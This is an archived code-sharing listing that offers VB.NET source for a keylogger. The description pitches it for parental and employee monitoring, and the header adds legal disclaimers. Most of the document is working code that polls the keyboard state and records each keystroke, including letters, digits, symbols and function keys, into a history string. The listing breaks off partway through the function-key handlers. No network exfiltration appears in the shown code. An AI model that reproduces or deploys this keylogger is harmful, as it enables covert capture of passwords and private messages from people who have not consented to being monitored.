<div align="center">

## Keylogger


</div>

### Description

Key-logger.... Great For Parental/employee Monitoring...

Don't Use This Illegally

5 Stars Please
 
### More Info
 


<span>             |<span>
---                |---
**Submitted On**   |
**By**             |[Paul Ishak](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByAuthor/paul-ishak.md)
**Level**          |Advanced
**User Rating**    |5.0 (10 globes from 2 users)
**Compatibility**  |VB\.NET
**Category**       |[Security](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByCategory/security__10-14.md)
**World**          |[\.Net \(C\#, VB\.net\)](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByWorld/net-c-vb-net.md)
**Archive File**   |[](https://github.com/Planet-Source-Code/paul-ishak-keylogger__10-8501/archive/master.zip)





### Source Code

```
Option Strict On
''''''''''''''''''''''''''''''''''''''''Actual Use Of This Software
''''''''''''''''''''''''''''''''''''''''Is Considered Illegal
''''''''''''''''''''''''''''''''''''''''If You Do Not Have Consent
''''''''''''''''''''''''''''''''''''''''From The Respective Owner
''''''''''''''''''''''''''''''''''''''''Of The Target Installation Machine
''' <summary>
''' This Software Is Shared Strictly For Educational Purposes
''' This Software Is Free For Non-Malicious Use
''' </summary>
''' <remarks></remarks>
Module KeyLogMod
  Public Declare Function GetAsyncKeyState Lib "user32.dll" (ByVal vKey As Int32) As UShort
  Public History As String
  Public CountA As Integer = 0 : Public CountB As Integer = 0 : Public CountC As Integer = 0
  Public CountD As Integer = 0 : Public CountE As Integer = 0 : Public CountF As Integer = 0
  Public CountG As Integer = 0 : Public CountH As Integer = 0 : Public CountI As Integer = 0
  Public CountJ As Integer = 0 : Public CountK As Integer = 0 : Public CountL As Integer = 0
  Public CountM As Integer = 0 : Public CountN As Integer = 0 : Public CountO As Integer = 0
  Public CountP As Integer = 0 : Public CountQ As Integer = 0 : Public CountR As Integer = 0
  Public CountS As Integer = 0 : Public CountT As Integer = 0 : Public CountU As Integer = 0
  Public CountV As Integer = 0 : Public CountW As Integer = 0 : Public CountX As Integer = 0
  Public CountY As Integer = 0 : Public CountZ As Integer = 0 : Public CountSpace As Integer = 0
  Public CountQuestionSlash As Integer = 0 : Public LessThanCommaCount As Integer = 0
  Public GreaterThanPeriodCount As Integer = 0 : Public ColinSemiColinCount As Integer = 0
  Public QuotationCount As Integer = 0 : Public OpenBracketsCount As Integer = 0
  Public CloseBracketsCount As Integer = 0 : Public SlashPipeCount As Integer = 0
  Public TildeCount As Integer = 0 : Public Count1 As Integer = 0 : Public Count2 As Integer = 0
  Public Count3 As Integer = 0 : Public Count4 As Integer = 0 : Public Count5 As Integer = 0
  Public Count6 As Integer = 0 : Public Count7 As Integer = 0 : Public Count8 As Integer = 0
  Public Count9 As Integer = 0 : Public Count0 As Integer = 0
  Public MinusCount As Integer = 0 : Public PlusCount As Integer = 0
  'Functional
  Public CountTab As Integer = 0 : Public ControlLeftCount As Integer = 0 : Public ControlRightCount As Integer = 0
  Public AltCount As Integer = 0 : Public BackSpaceCount As Integer = 0 : Public EnterCount As Integer = 0
  Public PrntScrCount As Integer = 0 : Public EscapeCount As Integer = 0
  Public FunctionCount1 As Integer = 0 : Public FunctionCount2 As Integer = 0 : Public FunctionCount3 As Integer = 0
  Public FunctionCount4 As Integer = 0 : Public FunctionCount5 As Integer = 0 : Public FunctionCount6 As Integer = 0
  Public FunctionCount7 As Integer = 0 : Public FunctionCount8 As Integer = 0 : Public FunctionCount9 As Integer = 0
  Public FunctionCount10 As Integer = 0 : Public FunctionCount11 As Integer = 0 : Public FunctionCount12 As Integer = 0
  Public FunctionCount13 As Integer = 0 : Public FunctionCount14 As Integer = 0 : Public FunctionCount15 As Integer = 0
  Public FunctionCount16 As Integer = 0 : Public FunctionCount17 As Integer = 0 : Public FunctionCount18 As Integer = 0
  Public FunctionCount19 As Integer = 0 : Public FunctionCount20 As Integer = 0 : Public FunctionCount21 As Integer = 0
  Public FunctionCount22 As Integer = 0 : Public FunctionCount23 As Integer = 0 : Public FunctionCount24 As Integer = 0
  Public Count As Integer = 0
  Function PressedKey() As String
    PressedKey = ""
    For I = 32 To 128
      'Get the keystate of a specified key
      If GetAsyncKeyState(I) <> 0 Then
        PressedKey = Chr(I)
        Exit For
      End If
    Next
  End Function
  Public ReadOnly Property KeyIsDown(ByVal Key As Keys) As Boolean
    Get
      Return CBool(GetAsyncKeyState(Key) And &H8000US)
    End Get
  End Property
  Public Function FrameKeyLogMAIN() As String
    'Use This function In A Timer To Return
    'The Keylogger History To A TextBox
    'Alphabit
    LogAkey() : LogBkey() : LogCkey() : LogDkey() : LogEkey() : LogFkey()
    LogGkey() : LogHkey() : LogIkey() : LogJkey() : LogKkey() : LogLkey()
    LogMkey() : LogNkey() : LogOkey() : LogPkey() : LogQkey() : LogRkey()
    LogSkey() : LogTkey() : LogUkey() : LogVkey() : LogWkey() : LogXkey()
    'Numbers
    LogNumber1Key() : LogNumber2Key() : LogNumber3Key() : LogNumber4Key()
    LogNumber5Key() : LogNumber6Key() : LogNumber7Key() : LogNumber8Key()
    LogNumber9Key() : LogNumber0Key()
    'Symbols
    LogYkey() : LogZkey() : LogSpacekey() : LogQuestionSlashkey() : LogLessThanCommakey()
    LogGreaterThanPeriodKey() : LogColinSemiColinKey() : LogQuotationKey()
    LogOpenBracketsKey() : LogCloseBracketsKey() : LogSlashPipeKey()
    LogTildeKey() : LogMinusKey() : LogPlusKey()
    'Functional
    LogTabKey() : LogLeftControlKey() : LogRightControlKey() : LogAltKey()
    LogBackKey() : LogEnterKey() : LogPrntScrKey() : LogEscapeKey()
    'Function Keys
    LogF1Key() : LogF2Key() : LogF3Key() : LogF4Key() : LogF5Key()
    LogF6Key() : LogF7Key() : LogF8Key() : LogF8Key() : LogF9Key() : LogF10Key()
    LogF11Key() : LogF12Key() : LogF13Key() : LogF14Key() : LogF15Key()
    LogF16Key() : LogF17Key() : LogF18Key() : LogF19Key() : LogF20Key()
    LogF21Key() : LogF22Key() : LogF23Key() : LogF24Key()
    Return History
  End Function
  Public Function CapLocks() As Boolean
    If Control.IsKeyLocked(Keys.CapsLock) Then
      Return True
    Else
      Return False
    End If
  End Function
  Public Function Shifted() As Boolean
    If KeyIsDown(Keys.LShiftKey) = True Or KeyIsDown(Keys.RShiftKey) = True Then
      Return True
    Else
      Return False
    End If
  End Function
  Public Sub LogAkey()
    If KeyIsDown(Keys.A) = True Then
      If CountA = 0 Then
        'Key Down Initialized
        CountA = CountA + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "A"
        Else
          History = History & "a"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountA = 0
    End If
  End Sub
  Public Sub LogBkey()
    If KeyIsDown(Keys.B) = True Then
      If CountB = 0 Then
        'Key Down Initialized
        CountB = CountB + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "B"
        Else
          History = History & "b"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountB = 0
    End If
  End Sub
  Public Sub LogCkey()
    If KeyIsDown(Keys.C) = True Then
      If CountC = 0 Then
        'Key Down Initialized
        CountC = CountC + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "C"
        Else
          History = History & "c"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountC = 0
    End If
  End Sub
  Public Sub LogDkey()
    If KeyIsDown(Keys.D) = True Then
      If CountD = 0 Then
        'Key Down Initialized
        CountD = CountD + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "D"
        Else
          History = History & "d"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountD = 0
    End If
  End Sub
  Public Sub LogEkey()
    If KeyIsDown(Keys.E) = True Then
      If CountE = 0 Then
        'Key Down Initialized
        CountE = CountE + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "E"
        Else
          History = History & "e"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountE = 0
    End If
  End Sub
  Public Sub LogFkey()
    If KeyIsDown(Keys.F) = True Then
      If CountF = 0 Then
        'Key Down Initialized
        CountF = CountF + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "F"
        Else
          History = History & "f"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountF = 0
    End If
  End Sub
  Public Sub LogGkey()
    If KeyIsDown(Keys.G) = True Then
      If CountG = 0 Then
        'Key Down Initialized
        CountG = CountG + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "G"
        Else
          History = History & "g"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountG = 0
    End If
  End Sub
  Public Sub LogHkey()
    If KeyIsDown(Keys.H) = True Then
      If CountH = 0 Then
        'Key Down Initialized
        CountH = CountH + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "H"
        Else
          History = History & "h"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountH = 0
    End If
  End Sub
  Public Sub LogIkey()
    If KeyIsDown(Keys.I) = True Then
      If CountI = 0 Then
        'Key Down Initialized
        CountI = CountI + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "I"
        Else
          History = History & "i"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountI = 0
    End If
  End Sub
  Public Sub LogJkey()
    If KeyIsDown(Keys.J) = True Then
      If CountJ = 0 Then
        'Key Down Initialized
        CountJ = CountJ + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "J"
        Else
          History = History & "j"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountJ = 0
    End If
  End Sub
  Public Sub LogKkey()
    If KeyIsDown(Keys.K) = True Then
      If CountK = 0 Then
        'Key Down Initialized
        CountK = CountK + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "K"
        Else
          History = History & "k"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountK = 0
    End If
  End Sub
  Public Sub LogLkey()
    If KeyIsDown(Keys.L) = True Then
      If CountL = 0 Then
        'Key Down Initialized
        CountL = CountL + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "L"
        Else
          History = History & "l"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountL = 0
    End If
  End Sub
  Public Sub LogMkey()
    If KeyIsDown(Keys.M) = True Then
      If CountM = 0 Then
        'Key Down Initialized
        CountM = CountM + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "M"
        Else
          History = History & "m"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountM = 0
    End If
  End Sub
  Public Sub LogNkey()
    If KeyIsDown(Keys.N) = True Then
      If CountN = 0 Then
        'Key Down Initialized
        CountN = CountN + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "N"
        Else
          History = History & "n"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountN = 0
    End If
  End Sub
  Public Sub LogOkey()
    If KeyIsDown(Keys.O) = True Then
      If CountO = 0 Then
        'Key Down Initialized
        CountO = CountO + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "O"
        Else
          History = History & "o"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountO = 0
    End If
  End Sub
  Public Sub LogPkey()
    If KeyIsDown(Keys.P) = True Then
      If CountP = 0 Then
        'Key Down Initialized
        CountP = CountP + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "P"
        Else
          History = History & "p"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountP = 0
    End If
  End Sub
  Public Sub LogQkey()
    If KeyIsDown(Keys.Q) = True Then
      If CountQ = 0 Then
        'Key Down Initialized
        CountQ = CountQ + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "Q"
        Else
          History = History & "q"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountQ = 0
    End If
  End Sub
  Public Sub LogRkey()
    If KeyIsDown(Keys.R) = True Then
      If CountR = 0 Then
        'Key Down Initialized
        CountR = CountR + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "R"
        Else
          History = History & "r"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountR = 0
    End If
  End Sub
  Public Sub LogSkey()
    If KeyIsDown(Keys.S) = True Then
      If CountS = 0 Then
        'Key Down Initialized
        CountS = CountS + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "S"
        Else
          History = History & "s"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountS = 0
    End If
  End Sub
  Public Sub LogTkey()
    If KeyIsDown(Keys.T) = True Then
      If CountT = 0 Then
        'Key Down Initialized
        CountT = CountT + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "T"
        Else
          History = History & "t"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountT = 0
    End If
  End Sub
  Public Sub LogUkey()
    If KeyIsDown(Keys.U) = True Then
      If CountU = 0 Then
        'Key Down Initialized
        CountU = CountU + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "U"
        Else
          History = History & "u"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountU = 0
    End If
  End Sub
  Public Sub LogVkey()
    If KeyIsDown(Keys.V) = True Then
      If CountV = 0 Then
        'Key Down Initialized
        CountV = CountV + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "V"
        Else
          History = History & "v"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountV = 0
    End If
  End Sub
  Public Sub LogWkey()
    If KeyIsDown(Keys.W) = True Then
      If CountW = 0 Then
        'Key Down Initialized
        CountW = CountW + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "W"
        Else
          History = History & "w"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountW = 0
    End If
  End Sub
  Public Sub LogXkey()
    If KeyIsDown(Keys.X) = True Then
      If CountX = 0 Then
        'Key Down Initialized
        CountX = CountX + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "X"
        Else
          History = History & "x"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountX = 0
    End If
  End Sub
  Public Sub LogYkey()
    If KeyIsDown(Keys.Y) = True Then
      If CountY = 0 Then
        'Key Down Initialized
        CountY = CountY + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "Y"
        Else
          History = History & "y"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountY = 0
    End If
  End Sub
  Public Sub LogZkey()
    If KeyIsDown(Keys.Z) = True Then
      If CountZ = 0 Then
        'Key Down Initialized
        CountZ = CountZ + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "Z"
        Else
          History = History & "z"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountZ = 0
    End If
  End Sub
  Public Sub LogSpacekey()
    If KeyIsDown(Keys.Space) = True Then
      If CountSpace = 0 Then
        'Key Down Initialized
        CountSpace = CountSpace + 1
        History = History & " "
      Else
        'While Key Is Down
      End If
    Else
      CountSpace = 0
    End If
  End Sub
  Public Sub LogQuestionSlashkey()
    If KeyIsDown(Keys.OemQuestion) = True Then
      If CountQuestionSlash = 0 Then
        'Key Down Initialized
        CountQuestionSlash = CountQuestionSlash + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "?"
        Else
          History = History & "/"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CountQuestionSlash = 0
    End If
  End Sub
  Public Sub LogLessThanCommakey()
    If KeyIsDown(Keys.Oemcomma) = True Then
      'MsgBox("d")
      If LessThanCommaCount = 0 Then
        'Key Down Initialized
        LessThanCommaCount = LessThanCommaCount + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "<"
        Else
          History = History & ","
        End If
      Else
        'While Key Is Down
      End If
    Else
      LessThanCommaCount = 0
    End If
  End Sub
  Public Sub LogGreaterThanPeriodKey()
    If KeyIsDown(Keys.OemPeriod) = True Then
      'MsgBox("d")
      If GreaterThanPeriodCount = 0 Then
        'Key Down Initialized
        GreaterThanPeriodCount = GreaterThanPeriodCount + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & ">"
        Else
          History = History & "."
        End If
      Else
        'While Key Is Down
      End If
    Else
      GreaterThanPeriodCount = 0
    End If
  End Sub
  Public Sub LogColinSemiColinKey()
    If KeyIsDown(Keys.OemSemicolon) = True Then
      'MsgBox("d")
      If ColinSemiColinCount = 0 Then
        'Key Down Initialized
        ColinSemiColinCount = ColinSemiColinCount + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & ":"
        Else
          History = History & ";"
        End If
      Else
        'While Key Is Down
      End If
    Else
      ColinSemiColinCount = 0
    End If
  End Sub
  Public Sub LogQuotationKey()
    If KeyIsDown(Keys.OemQuotes) = True Then
      'MsgBox("d")
      If QuotationCount = 0 Then
        'Key Down Initialized
        QuotationCount = QuotationCount + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & """"
        Else
          History = History & "'"
        End If
      Else
        'While Key Is Down
      End If
    Else
      QuotationCount = 0
    End If
  End Sub
  Public Sub LogOpenBracketsKey()
    If KeyIsDown(Keys.OemOpenBrackets) = True Then
      'MsgBox("d")
      If OpenBracketsCount = 0 Then
        'Key Down Initialized
        OpenBracketsCount = OpenBracketsCount + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "{"
        Else
          History = History & "["
        End If
      Else
        'While Key Is Down
      End If
    Else
      OpenBracketsCount = 0
    End If
  End Sub
  Public Sub LogCloseBracketsKey()
    If KeyIsDown(Keys.OemCloseBrackets) = True Then
      'MsgBox("d")
      If CloseBracketsCount = 0 Then
        'Key Down Initialized
        CloseBracketsCount = CloseBracketsCount + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "}"
        Else
          History = History & "]"
        End If
      Else
        'While Key Is Down
      End If
    Else
      CloseBracketsCount = 0
    End If
  End Sub
  Public Sub LogSlashPipeKey()
    If KeyIsDown(Keys.OemPipe) = True Then
      'MsgBox("d")
      If SlashPipeCount = 0 Then
        'Key Down Initialized
        SlashPipeCount = SlashPipeCount + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "|"
        Else
          History = History & "\"
        End If
      Else
        'While Key Is Down
      End If
    Else
      SlashPipeCount = 0
    End If
  End Sub
  Public Sub LogTildeKey()
    If KeyIsDown(Keys.Oemtilde) = True Then
      'MsgBox("d")
      If TildeCount = 0 Then
        'Key Down Initialized
        TildeCount = TildeCount + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "~"
        Else
          History = History & "`"
        End If
      Else
        'While Key Is Down
      End If
    Else
      TildeCount = 0
    End If
  End Sub
  Public Sub LogNumber1Key()
    If KeyIsDown(Keys.D1) = True Then
      'MsgBox("d")
      If Count1 = 0 Then
        'Key Down Initialized
        Count1 = Count1 + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "!"
        Else
          History = History & "1"
        End If
      Else
        'While Key Is Down
      End If
    Else
      Count1 = 0
    End If
  End Sub
  Public Sub LogNumber2Key()
    If KeyIsDown(Keys.D2) = True Then
      'MsgBox("d")
      If Count2 = 0 Then
        'Key Down Initialized
        Count2 = Count2 + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "@"
        Else
          History = History & "2"
        End If
      Else
        'While Key Is Down
      End If
    Else
      Count2 = 0
    End If
  End Sub
  Public Sub LogNumber3Key()
    If KeyIsDown(Keys.D3) = True Then
      'MsgBox("d")
      If Count3 = 0 Then
        'Key Down Initialized
        Count3 = Count3 + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "#"
        Else
          History = History & "3"
        End If
      Else
        'While Key Is Down
      End If
    Else
      Count3 = 0
    End If
  End Sub
  Public Sub LogNumber4Key()
    If KeyIsDown(Keys.D4) = True Then
      'MsgBox("d")
      If Count4 = 0 Then
        'Key Down Initialized
        Count4 = Count2 + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "$"
        Else
          History = History & "4"
        End If
      Else
        'While Key Is Down
      End If
    Else
      Count4 = 0
    End If
  End Sub
  Public Sub LogNumber5Key()
    If KeyIsDown(Keys.D5) = True Then
      'MsgBox("d")
      If Count5 = 0 Then
        'Key Down Initialized
        Count5 = Count5 + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "%"
        Else
          History = History & "5"
        End If
      Else
        'While Key Is Down
      End If
    Else
      Count5 = 0
    End If
  End Sub
  Public Sub LogNumber6Key()
    If KeyIsDown(Keys.D6) = True Then
      'MsgBox("d")
      If Count6 = 0 Then
        'Key Down Initialized
        Count6 = Count6 + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "^"
        Else
          History = History & "6"
        End If
      Else
        'While Key Is Down
      End If
    Else
      Count6 = 0
    End If
  End Sub
  Public Sub LogNumber7Key()
    If KeyIsDown(Keys.D7) = True Then
      'MsgBox("d")
      If Count7 = 0 Then
        'Key Down Initialized
        Count7 = Count7 + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "&"
        Else
          History = History & "7"
        End If
      Else
        'While Key Is Down
      End If
    Else
      Count7 = 0
    End If
  End Sub
  Public Sub LogNumber8Key()
    If KeyIsDown(Keys.D8) = True Then
      'MsgBox("d")
      If Count8 = 0 Then
        'Key Down Initialized
        Count8 = Count8 + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "*"
        Else
          History = History & "8"
        End If
      Else
        'While Key Is Down
      End If
    Else
      Count8 = 0
    End If
  End Sub
  Public Sub LogNumber9Key()
    If KeyIsDown(Keys.D9) = True Then
      'MsgBox("d")
      If Count9 = 0 Then
        'Key Down Initialized
        Count9 = Count9 + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "("
        Else
          History = History & "9"
        End If
      Else
        'While Key Is Down
      End If
    Else
      Count9 = 0
    End If
  End Sub
  Public Sub LogNumber0Key()
    If KeyIsDown(Keys.D0) = True Then
      'MsgBox("d")
      If Count0 = 0 Then
        'Key Down Initialized
        Count0 = Count0 + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & ")"
        Else
          History = History & "0"
        End If
      Else
        'While Key Is Down
      End If
    Else
      Count0 = 0
    End If
  End Sub
  Public Sub LogMinusKey()
    If KeyIsDown(Keys.OemMinus) = True Then
      'MsgBox("d")
      If MinusCount = 0 Then
        'Key Down Initialized
        MinusCount = MinusCount + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "_"
        Else
          History = History & "-"
        End If
      Else
        'While Key Is Down
      End If
    Else
      MinusCount = 0
    End If
  End Sub
  Public Sub LogPlusKey()
    If KeyIsDown(Keys.Oemplus) = True Then
      'MsgBox("d")
      If PlusCount = 0 Then
        'Key Down Initialized
        PlusCount = PlusCount + 1
        If CapLocks() = True Or Shifted() = True Then
          History = History & "+"
        Else
          History = History & "="
        End If
      Else
        'While Key Is Down
      End If
    Else
      PlusCount = 0
    End If
  End Sub
  Public Sub LogTabKey()
    If KeyIsDown(Keys.Tab) = True Then
      'MsgBox("d")
      If CountTab = 0 Then
        'Key Down Initialized
        CountTab = CountTab + 1
        History = History & "[TAB KEY]"
      Else
        'While Key Is Down
      End If
    Else
      CountTab = 0
    End If
  End Sub
  Public Sub LogLeftControlKey()
    If KeyIsDown(Keys.LControlKey) = True Then
      'MsgBox("d")
      If ControlLeftCount = 0 Then
        'Key Down Initialized
        ControlLeftCount = ControlLeftCount + 1
        History = History & "[LCTRL]"
      Else
        'While Key Is Down
      End If
    Else
      ControlLeftCount = 0
    End If
  End Sub
  Public Sub LogRightControlKey()
    If KeyIsDown(Keys.RControlKey) = True Then
      'MsgBox("d")
      If ControlRightCount = 0 Then
        'Key Down Initialized
        ControlRightCount = ControlRightCount + 1
        History = History & "[RCTRL]"
      Else
        'While Key Is Down
      End If
    Else
      ControlRightCount = 0
    End If
  End Sub
  Public Sub LogAltKey()
    If KeyIsDown(Keys.Alt) = True Then
      'MsgBox("d")
      If AltCount = 0 Then
        'Key Down Initialized
        AltCount = AltCount + 1
        History = History & "[ALT]"
      Else
        'While Key Is Down
      End If
    Else
      AltCount = 0
    End If
  End Sub
  Public Sub LogBackKey()
    If KeyIsDown(Keys.Back) = True Then
      'MsgBox("d")
      If BackSpaceCount = 0 Then
        'Key Down Initialized
        BackSpaceCount = BackSpaceCount + 1
        History = History & "[BACK]"
      Else
        'While Key Is Down
      End If
    Else
      BackSpaceCount = 0
    End If
  End Sub
  Public Sub LogEnterKey()
    If KeyIsDown(Keys.Enter) = True Then
      'MsgBox("d")
      If EnterCount = 0 Then
        'Key Down Initialized
        EnterCount = EnterCount + 1
        History = History & "[ENT]"
      Else
        'While Key Is Downt
      End If
    Else
      EnterCount = 0
    End If
  End Sub
  Public Sub LogPrntScrKey()
    If KeyIsDown(Keys.PrintScreen) = True Then
      'MsgBox("d")
      If PrntScrCount = 0 Then
        'Key Down Initialized
        PrntScrCount = PrntScrCount + 1
        History = History & "[PrintScr]"
      Else
        'While Key Is Downt
      End If
    Else
      PrntScrCount = 0
    End If
  End Sub
  Public Sub LogEscapeKey()
    If KeyIsDown(Keys.Escape) = True Then
      'MsgBox("d")
      If EscapeCount = 0 Then
        'Key Down Initialized
        EscapeCount = EscapeCount + 1
        History = History & "[ESC]"
      Else
        'While Key Is Downt
      End If
    Else
      EscapeCount = 0
    End If
  End Sub
  Public Sub LogF1Key()
    If KeyIsDown(Keys.F1) = True Then
      'MsgBox("d")
      If FunctionCount1 = 0 Then
        'Key Down Initialized
        FunctionCount1 = FunctionCount1 + 1
        History = History & "[F1]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount1 = 0
    End If
  End Sub
  Public Sub LogF2Key()
    If KeyIsDown(Keys.F2) = True Then
      'MsgBox("d")
      If FunctionCount2 = 0 Then
        'Key Down Initialized
        FunctionCount2 = FunctionCount2 + 1
        History = History & "[F2]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount2 = 0
    End If
  End Sub
  Public Sub LogF3Key()
    If KeyIsDown(Keys.F3) = True Then
      'MsgBox("d")
      If FunctionCount3 = 0 Then
        'Key Down Initialized
        FunctionCount3 = FunctionCount3 + 1
        History = History & "[F3]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount3 = 0
    End If
  End Sub
  Public Sub LogF4Key()
    If KeyIsDown(Keys.F4) = True Then
      'MsgBox("d")
      If FunctionCount4 = 0 Then
        'Key Down Initialized
        FunctionCount4 = FunctionCount4 + 1
        History = History & "[F4]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount4 = 0
    End If
  End Sub
  Public Sub LogF5Key()
    If KeyIsDown(Keys.F5) = True Then
      'MsgBox("d")
      If FunctionCount5 = 0 Then
        'Key Down Initialized
        FunctionCount5 = FunctionCount5 + 1
        History = History & "[F5]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount5 = 0
    End If
  End Sub
  Public Sub LogF6Key()
    If KeyIsDown(Keys.F6) = True Then
      'MsgBox("d")
      If FunctionCount6 = 0 Then
        'Key Down Initialized
        FunctionCount6 = FunctionCount6 + 1
        History = History & "[F6]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount6 = 0
    End If
  End Sub
  Public Sub LogF7Key()
    If KeyIsDown(Keys.F7) = True Then
      'MsgBox("d")
      If FunctionCount7 = 0 Then
        'Key Down Initialized
        FunctionCount7 = FunctionCount7 + 1
        History = History & "[F7]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount7 = 0
    End If
  End Sub
  Public Sub LogF8Key()
    If KeyIsDown(Keys.F8) = True Then
      'MsgBox("d")
      If FunctionCount8 = 0 Then
        'Key Down Initialized
        FunctionCount8 = FunctionCount8 + 1
        History = History & "[F8]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount8 = 0
    End If
  End Sub
  Public Sub LogF9Key()
    If KeyIsDown(Keys.F9) = True Then
      'MsgBox("d")
      If FunctionCount9 = 0 Then
        'Key Down Initialized
        FunctionCount9 = FunctionCount9 + 1
        History = History & "[F9]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount9 = 0
    End If
  End Sub
  Public Sub LogF10Key()
    If KeyIsDown(Keys.F10) = True Then
      'MsgBox("d")
      If FunctionCount10 = 0 Then
        'Key Down Initialized
        FunctionCount10 = FunctionCount10 + 1
        History = History & "[F10]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount10 = 0
    End If
  End Sub
  Public Sub LogF11Key()
    If KeyIsDown(Keys.F11) = True Then
      'MsgBox("d")
      If FunctionCount11 = 0 Then
        'Key Down Initialized
        FunctionCount11 = FunctionCount11 + 1
        History = History & "[F11]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount11 = 0
    End If
  End Sub
  Public Sub LogF12Key()
    If KeyIsDown(Keys.F12) = True Then
      'MsgBox("d")
      If FunctionCount12 = 0 Then
        'Key Down Initialized
        FunctionCount12 = FunctionCount12 + 1
        History = History & "[F12]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount12 = 0
    End If
  End Sub
  Public Sub LogF13Key()
    If KeyIsDown(Keys.F13) = True Then
      'MsgBox("d")
      If FunctionCount13 = 0 Then
        'Key Down Initialized
        FunctionCount13 = FunctionCount13 + 1
        History = History & "[F13]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount13 = 0
    End If
  End Sub
  Public Sub LogF14Key()
    If KeyIsDown(Keys.F14) = True Then
      'MsgBox("d")
      If FunctionCount14 = 0 Then
        'Key Down Initialized
        FunctionCount14 = FunctionCount14 + 1
        History = History & "[F14]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount14 = 0
    End If
  End Sub
  Public Sub LogF15Key()
    If KeyIsDown(Keys.F15) = True Then
      'MsgBox("d")
      If FunctionCount15 = 0 Then
        'Key Down Initialized
        FunctionCount15 = FunctionCount15 + 1
        History = History & "[F15]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount15 = 0
    End If
  End Sub
  Public Sub LogF16Key()
    If KeyIsDown(Keys.F16) = True Then
      'MsgBox("d")
      If FunctionCount16 = 0 Then
        'Key Down Initialized
        FunctionCount16 = FunctionCount16 + 1
        History = History & "[F16]"
      Else
        'While Key Is Downt
      End If
